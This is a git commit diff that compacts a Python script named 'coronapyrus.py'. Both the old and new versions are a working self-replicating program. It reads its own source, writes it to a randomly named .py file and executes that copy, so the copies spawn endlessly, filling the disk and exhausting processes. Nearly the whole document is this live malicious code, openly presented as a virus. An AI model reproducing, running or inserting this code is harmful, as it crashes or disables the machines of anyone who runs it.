5d7c8808e12b9567f70cd4a99f38857e8d8f58ae
QuaKe8782 <mastermind4560@gmail.com>
2021-01-19 14:54:14 +0000

    Make code more compact

--- coronapyrus.py
+++ coronapyrus.py
@@ -1,19 +1,7 @@
-import os
-import string
-import random
-from subprocess import call
-
-def create_string():
-    return "".join([random.choice(string.ascii_letters) for x in range(random.randint(5, 20))])
-
-with open(__file__, 'r') as file:
-    data = file.read()
-
-filename = f"{create_string()}.py"
-
+import os; import string; import random; from subprocess import call
+def create_string(): return "".join([random.choice(string.ascii_letters) for x in range(random.randint(5, 20))])
+with open(__file__, 'r') as file: data = file.read(); filename = f"{create_string()}.py"
 with open(filename, 'x') as file:
     with open(filename, 'w') as file2:
         file2.write(data)
-
 call(["python", filename])
-
